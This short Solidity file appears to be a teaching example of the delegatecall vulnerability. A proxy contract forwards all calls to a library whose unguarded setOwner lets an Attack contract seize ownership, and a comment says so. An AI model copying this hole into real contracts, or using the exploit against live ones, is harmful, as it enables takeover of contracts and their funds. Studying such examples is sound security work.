// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

contract First {
    address public owner;

    function setOwner () public {
        owner = msg.sender;
    }
}

contract Second {
    address public owner;
    First public first;

    constructor (First _first) {
        first = First (_first);
    }

    fallback () external payable {
        address (first).delegatecall(msg.data);
    }
}
// Attacker can be owner of Second contract with calling attack function!
contract Attack {
    address public second;
    
    constructor (address _second) {
        second = _second;
    }

    function attack () public {
        second.call(abi.encodeWithSignature("setOwner()"));
    }
}

